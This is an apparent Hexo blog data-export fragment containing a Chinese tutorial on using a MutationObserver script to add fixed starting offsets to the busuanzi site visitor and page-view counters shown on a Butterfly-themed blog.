分析\n\n首先我们看一下不蒜子的源码是怎么实现统计和展示数据的，打开上述脚本中的js文件，可以发现代码还是不多的，格式化美化之后才60多行。从源码片段中可以得知，主要数据就3个：\n\n```javascript\n...\n}), bszTag = {\n    bszs: [\"site_pv\", \"page_pv\", \"site_uv\"],\n    texts: function (a) {\n        this.bszs.map(function (b) {\n            var c = document.getElementById(\"busuanzi_value_\" + b);\n            c && (c.innerHTML = a[b])\n        })\n    },\n...\n```\n\n分别是site_pv对应网站访问总次数，page_pv对应每个子页面的访问次数，site_uv对应网站访问的人数，并通过给元素的innerHTML赋值来展示数据。\n\n了解完源码，我们就有大致解决思路了，监听对应元素的加载和变化，在真实数据赋值时，加上自己需要的初始值。\n\n### 解决\n\n直接上JS代码，此处我按个人需求只更改网站的uv和pv，子页面的pv不关注：\n\n```javascript\ndocument.addEventListener(\"DOMContentLoaded\", function () {\n    const uvE = document.getElementById('busuanzi_value_site_uv');\n    const pvE = document.getElementById('busuanzi_value_site_pv');\n    const uvObs = new MutationObserver((mutationsList) => {\n        for (let mutation of mutationsList) {\n            if (mutation.type === 'childList') {\n                uvObs.disconnect();\n                mutation.target.innerHTML = parseInt(mutation.target.innerHTML) + 100000;\n                break;\n            }\n        }\n    });\n    const pvObs = new MutationObserver((mutationsList) => {\n        for (let mutation of mutationsList) {\n            if (mutation.type === 'childList') {\n                pvObs.disconnect();\n                mutation.target.innerHTML = parseInt(mutation.target.innerHTML) + 300000;\n                break;\n            }\n        }\n    });\n    const config = {\n        childList: true\n    };\n    uvObs.observe(uvE, config);\n    pvObs.observe(pvE, config);\n});\n```\n\n首先我们监听DOMContentLoaded事件，在HTML加载完成后，从DOM树中拿到busuanzi_value_site_uv和busuanzi_value_site_pv，再分别监听它们的元素属性变化。比如我这里当uv变化时，就加上一个初始值10万，pv变化时，就加上30万。最终结果就是自定义的这个初始值加上不蒜子的真实统计数据。\n\n把上述代码压缩成一行后加入到script标签中，再添加到HTML的head里面即可：\n\n```html\n...\n<head>\n  <script>document.addEventListener(\"DOMContentLoaded\",function(){const e=document.getElementById(\"busuanzi_value_site_uv\"),t=document.getElementById(\"busuanzi_value_site_pv\"),n=new MutationObserver(e=>{for(let t of e)if(\"childList\"===t.type){n.disconnect(),t.target.innerHTML=parseInt(t.target.innerHTML)+1e5;break}}),i=new MutationObserver(e=>{for(let t of e)if(\"childList\"===t.type){i.disconnect(),t.target.innerHTML=parseInt(t.target.innerHTML)+3e5;break}}),r={childList:!0};n.observe(e,r),i.observe(t,r)});</script>\n</head>\n...\n```\n\n对于使用Butterfly主题的博主来说，可直接修改主题配置文件中的inject，框架会自动插入代码到head中：\n\n```yaml\n# Inject\n# Insert the code to head (before '</head>' tag) and the bottom (before '</body>' tag)\n# 插入代码到头部 </head> 之前 和 底部 </body> 之前\ninject:\n  head:\n  # - <link rel=\"stylesheet\" href=\"/xxx.css\">\n    - <script>...</script>\n```\n\n之所以把JS代码压缩成一行，也是方便这里配置。","slug":"给不蒜子（busuanzi）统计数据增加初始值","published":1,"updated":"2024-03-25T07:31:26.044Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cluaufh1p005fthe61swf8760","content":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>最近把个人博客迁移到了<a href=\"https://hexo.io/\">Hexo框架</a>，并使用了<a href=\"https://butterfly.js.org/posts/4aa8abbe/#%E8%A8%AA%E5%95%8F%E4%BA%BA%E6%95%B8-busuanzi-UV-%E5%92%8C-PV\">Butterfly主题</a>，得益于博客框架的易用性和主题功能的丰富程度，感觉非常的香。我对比了很多Hexo主题，这一个算是在功能、审美、文档等各方面几乎完美符合我需求的。</p>\n<p>Butterfly很贴心地集成了<a href=\"http://busuanzi.ibruce.info/\">不蒜子</a>计数工具，可以统计网站的访问数据（人数，次数等）。只需要修改主题config文件即可开启：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">busuanzi:</span></span><br><span class=\"line\">  <span class=\"attr\">site_uv:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">site_pv:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">page_pv:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p>即便没有使用Hexo框架和Butterfly主题，用不蒜子计数也是很简单的。</p>\n<p>这个工具存在快十年了，其首页的标语就是“两行代码，搞定计数”。感觉这位作者也是个有情怀的开发者，维护服务器给大家免费使用这么多年。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script <span class=\"keyword\">async</span> src=<span class=\"string\">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">            <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_pv&quot;</span>&gt;</span>本站总访问量<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span>次<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p>但是，有个小问题，如果你的网站首次集成这个脚本，计数自然是从0开始的，对于很多已经运行很久的网站，不能很客观的展示数据，我们更想要的是能够从一个初始值开始计数。比如我的个人博客在本次大更新之前，就有大约十万访问量了，我希望可以从十万开始统计数据。</p>\n<p>不蒜子本身暂时还不支持我这个需求，所以我们只能自己写JS来搞定了。</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>首先我们看一下不蒜子的源码是怎么实现统计和展示数据的，打开上述脚本中的js文件，可以发现代码还是不多的，格式化美化之后才60多行。从源码片段中可以得知，主要数据就3个：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">&#125;), bszTag = &#123;</span><br><span class=\"line\">    <span class=\"attr\">bszs</span>: [<span class=\"string\">&quot;site_pv&quot;</span>, <span class=\"string\">&quot;page_pv&quot;</span>, <span class=\"string\">&quot;site_uv&quot;</span>],</span><br><span class=\"line\">    <span class=\"attr\">texts</span>: <span class=\"keyword\">function</span> (<span class=\"params\">a</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">bszs</span>.<span class=\"title function_\">map</span>(<span class=\"keyword\">function</span> (<span class=\"params\">b</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> c = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;busuanzi_value_&quot;</span> + b);</span><br><span class=\"line\">            c &amp;&amp; (c.<span class=\"property\">innerHTML</span> = a[b])</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>分别是site_pv对应网站访问总次数，page_pv对应每个子页面的访问次数，site_uv对应网站访问的人数，并通过给元素的innerHTML赋值来展示数据。</p>\n<p>了解完源码，我们就有大致解决思路了，监听对应元素的加载和变化，在真实数据赋值时，加上自己需要的初始值。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>直接上JS代码，此处我按个人需求只更改网站的uv和pv，子页面的pv不关注：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;DOMContentLoaded&quot;</span>, <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> uvE = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;busuanzi_value_site_uv&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> pvE = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;busuanzi_value_site_pv&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> uvObs = <span class=\"keyword\">new</span> <span class=\"title class_\">MutationObserver</span>(<span class=\"function\">(<span class=\"params\">mutationsList</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> mutation <span class=\"keyword\">of</span> mutationsList) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mutation.<span class=\"property\">type</span> === <span class=\"string\">&#x27;childList&#x27;</span>) &#123;</span><br><span class=\"line\">                uvObs.<span class=\"title function_\">disconnect</span>();</span><br><span class=\"line\">                mutation.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span> = <span class=\"built_in\">parseInt</span>(mutation.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>) + <span class=\"number\">100000</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> pvObs = <span class=\"keyword\">new</span> <span class=\"title class_\">MutationObserver</span>(<span class=\"function\">(<span class=\"params\">mutationsList</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> mutation <span class=\"keyword\">of</span> mutationsList) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mutation.<span class=\"property\">type</span> === <span class=\"string\">&#x27;childList&#x27;</span>) &#123;</span><br><span class=\"line\">                pvObs.<span class=\"title function_\">disconnect</span>();</span><br><span class=\"line\">                mutation.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span> = <span class=\"built_in\">parseInt</span>(mutation.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>) + <span class=\"number\">300000</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> config = &#123;</span><br><span class=\"line\">        <span class=\"attr\">childList</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    uvObs.<span class=\"title function_\">observe</span>(uvE, config);</span><br><span class=\"line\">    pvObs.<span class=\"title function_\">observe</span>(pvE, config);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>首先我们监听DOMContentLoaded事件，在HTML加载完成后，从DOM树中拿到busuanzi_value_site_uv和busuanzi_value_site_pv，再分别监听它们的元素属性变化。比如我这里当uv变化时，就加上一个初始值10万，pv变化时，就加上30万。最终结果就是自定义的这个初始值加上不蒜子的真实统计数据。</p>\n<p>把上述代码压缩成一行后加入到script标签中，再添加到HTML的head里面即可：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"variable language_\">document</span>.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;DOMContentLoaded&quot;</span>,<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;<span class=\"keyword\">const</span> e=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;busuanzi_value_site_uv&quot;</span>),t=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>),n=<span class=\"keyword\">new</span> <span class=\"title class_\">MutationObserver</span>(<span class=\"function\"><span class=\"params\">e</span>=&gt;</span>&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> t <span class=\"keyword\">of</span> e)<span class=\"keyword\">if</span>(<span class=\"string\">&quot;childList&quot;</span>===t.<span class=\"property\">type</span>)&#123;n.<span class=\"title function_\">disconnect</span>(),t.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>=<span class=\"built_in\">parseInt</span>(t.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>)+<span class=\"number\">1e5</span>;<span class=\"keyword\">break</span>&#125;&#125;),i=<span class=\"keyword\">new</span> <span class=\"title class_\">MutationObserver</span>(<span class=\"function\"><span class=\"params\">e</span>=&gt;</span>&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> t <span class=\"keyword\">of</span> e)<span class=\"keyword\">if</span>(<span class=\"string\">&quot;childList&quot;</span>===t.<span class=\"property\">type</span>)&#123;i.<span class=\"title function_\">disconnect</span>(),t.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>=<span class=\"built_in\">parseInt</span>(t.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>)+<span class=\"number\">3e5</span>;<span class=\"keyword\">break</span>&#125;&#125;),r=&#123;<span class=\"attr\">childList</span>:!<span class=\"number\">0</span>&#125;;n.<span class=\"title function_\">observe</span>(e,r),i.<span class=\"title function_\">observe</span>(t,r)&#125;);</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>对于使用Butterfly主题的博主来说，可直接修改主题配置文件中的inject，框架会自动插入代码到head中：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Inject</span></span><br><span class=\"line\"><span class=\"comment\"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class=\"line\"><span class=\"comment\"># 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class=\"line\"><span class=\"attr\">inject:</span></span><br><span class=\"line\">  <span class=\"attr\">head:</span></span><br><span class=\"line\">  <span class=\"comment\"># - &lt;link rel=&quot;stylesheet&quot; href=&quot;/xxx.css&quot;&gt;</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">&lt;script&gt;...&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>之所以把JS代码压缩成一行，也是方便这里配置。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"背景\"><a href=\"#背景\" class=\"headerlink\" title=\"背景\"></a>背景</h3><p>最近把个人博客迁移到了<a href=\"https://hexo.io/\">Hexo框架</a>，并使用了<a href=\"https://butterfly.js.org/posts/4aa8abbe/#%E8%A8%AA%E5%95%8F%E4%BA%BA%E6%95%B8-busuanzi-UV-%E5%92%8C-PV\">Butterfly主题</a>，得益于博客框架的易用性和主题功能的丰富程度，感觉非常的香。我对比了很多Hexo主题，这一个算是在功能、审美、文档等各方面几乎完美符合我需求的。</p>\n<p>Butterfly很贴心地集成了<a href=\"http://busuanzi.ibruce.info/\">不蒜子</a>计数工具，可以统计网站的访问数据（人数，次数等）。只需要修改主题config文件即可开启：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">busuanzi:</span></span><br><span class=\"line\">  <span class=\"attr\">site_uv:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">site_pv:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">page_pv:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p>即便没有使用Hexo框架和Butterfly主题，用不蒜子计数也是很简单的。</p>\n<p>这个工具存在快十年了，其首页的标语就是“两行代码，搞定计数”。感觉这位作者也是个有情怀的开发者，维护服务器给大家免费使用这么多年。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script <span class=\"keyword\">async</span> src=<span class=\"string\">&quot;//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class=\"line\">            <span class=\"language-xml\"><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;busuanzi_container_site_pv&quot;</span>&gt;</span>本站总访问量<span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span>次<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span></span><br></pre></td></tr></table></figure>\n\n<p>但是，有个小问题，如果你的网站首次集成这个脚本，计数自然是从0开始的，对于很多已经运行很久的网站，不能很客观的展示数据，我们更想要的是能够从一个初始值开始计数。比如我的个人博客在本次大更新之前，就有大约十万访问量了，我希望可以从十万开始统计数据。</p>\n<p>不蒜子本身暂时还不支持我这个需求，所以我们只能自己写JS来搞定了。</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>首先我们看一下不蒜子的源码是怎么实现统计和展示数据的，打开上述脚本中的js文件，可以发现代码还是不多的，格式化美化之后才60多行。从源码片段中可以得知，主要数据就3个：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\">&#125;), bszTag = &#123;</span><br><span class=\"line\">    <span class=\"attr\">bszs</span>: [<span class=\"string\">&quot;site_pv&quot;</span>, <span class=\"string\">&quot;page_pv&quot;</span>, <span class=\"string\">&quot;site_uv&quot;</span>],</span><br><span class=\"line\">    <span class=\"attr\">texts</span>: <span class=\"keyword\">function</span> (<span class=\"params\">a</span>) &#123;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">bszs</span>.<span class=\"title function_\">map</span>(<span class=\"keyword\">function</span> (<span class=\"params\">b</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">var</span> c = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;busuanzi_value_&quot;</span> + b);</span><br><span class=\"line\">            c &amp;&amp; (c.<span class=\"property\">innerHTML</span> = a[b])</span><br><span class=\"line\">        &#125;)</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>分别是site_pv对应网站访问总次数，page_pv对应每个子页面的访问次数，site_uv对应网站访问的人数，并通过给元素的innerHTML赋值来展示数据。</p>\n<p>了解完源码，我们就有大致解决思路了，监听对应元素的加载和变化，在真实数据赋值时，加上自己需要的初始值。</p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><p>直接上JS代码，此处我按个人需求只更改网站的uv和pv，子页面的pv不关注：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;DOMContentLoaded&quot;</span>, <span class=\"keyword\">function</span> (<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> uvE = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;busuanzi_value_site_uv&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> pvE = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&#x27;busuanzi_value_site_pv&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> uvObs = <span class=\"keyword\">new</span> <span class=\"title class_\">MutationObserver</span>(<span class=\"function\">(<span class=\"params\">mutationsList</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> mutation <span class=\"keyword\">of</span> mutationsList) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mutation.<span class=\"property\">type</span> === <span class=\"string\">&#x27;childList&#x27;</span>) &#123;</span><br><span class=\"line\">                uvObs.<span class=\"title function_\">disconnect</span>();</span><br><span class=\"line\">                mutation.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span> = <span class=\"built_in\">parseInt</span>(mutation.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>) + <span class=\"number\">100000</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> pvObs = <span class=\"keyword\">new</span> <span class=\"title class_\">MutationObserver</span>(<span class=\"function\">(<span class=\"params\">mutationsList</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> mutation <span class=\"keyword\">of</span> mutationsList) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (mutation.<span class=\"property\">type</span> === <span class=\"string\">&#x27;childList&#x27;</span>) &#123;</span><br><span class=\"line\">                pvObs.<span class=\"title function_\">disconnect</span>();</span><br><span class=\"line\">                mutation.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span> = <span class=\"built_in\">parseInt</span>(mutation.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>) + <span class=\"number\">300000</span>;</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    <span class=\"keyword\">const</span> config = &#123;</span><br><span class=\"line\">        <span class=\"attr\">childList</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    uvObs.<span class=\"title function_\">observe</span>(uvE, config);</span><br><span class=\"line\">    pvObs.<span class=\"title function_\">observe</span>(pvE, config);</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>首先我们监听DOMContentLoaded事件，在HTML加载完成后，从DOM树中拿到busuanzi_value_site_uv和busuanzi_value_site_pv，再分别监听它们的元素属性变化。比如我这里当uv变化时，就加上一个初始值10万，pv变化时，就加上30万。最终结果就是自定义的这个初始值加上不蒜子的真实统计数据。</p>\n<p>把上述代码压缩成一行后加入到script标签中，再添加到HTML的head里面即可：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">...</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"><span class=\"variable language_\">document</span>.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;DOMContentLoaded&quot;</span>,<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;<span class=\"keyword\">const</span> e=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;busuanzi_value_site_uv&quot;</span>),t=<span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">&quot;busuanzi_value_site_pv&quot;</span>),n=<span class=\"keyword\">new</span> <span class=\"title class_\">MutationObserver</span>(<span class=\"function\"><span class=\"params\">e</span>=&gt;</span>&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> t <span class=\"keyword\">of</span> e)<span class=\"keyword\">if</span>(<span class=\"string\">&quot;childList&quot;</span>===t.<span class=\"property\">type</span>)&#123;n.<span class=\"title function_\">disconnect</span>(),t.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>=<span class=\"built_in\">parseInt</span>(t.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>)+<span class=\"number\">1e5</span>;<span class=\"keyword\">break</span>&#125;&#125;),i=<span class=\"keyword\">new</span> <span class=\"title class_\">MutationObserver</span>(<span class=\"function\"><span class=\"params\">e</span>=&gt;</span>&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> t <span class=\"keyword\">of</span> e)<span class=\"keyword\">if</span>(<span class=\"string\">&quot;childList&quot;</span>===t.<span class=\"property\">type</span>)&#123;i.<span class=\"title function_\">disconnect</span>(),t.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>=<span class=\"built_in\">parseInt</span>(t.<span class=\"property\">target</span>.<span class=\"property\">innerHTML</span>)+<span class=\"number\">3e5</span>;<span class=\"keyword\">break</span>&#125;&#125;),r=&#123;<span class=\"attr\">childList</span>:!<span class=\"number\">0</span>&#125;;n.<span class=\"title function_\">observe</span>(e,r),i.<span class=\"title function_\">observe</span>(t,r)&#125;);</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">...</span><br></pre></td></tr></table></figure>\n\n<p>对于使用Butterfly主题的博主来说，可直接修改主题配置文件中的inject，框架会自动插入代码到head中：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Inject</span></span><br><span class=\"line\"><span class=\"comment\"># Insert the code to head (before &#x27;&lt;/head&gt;&#x27; tag) and the bottom (before &#x27;&lt;/body&gt;&#x27; tag)</span></span><br><span class=\"line\"><span class=\"comment\"># 插入代码到头部 &lt;/head&gt; 之前 和 底部 &lt;/body&gt; 之前</span></span><br><span class=\"line\"><span 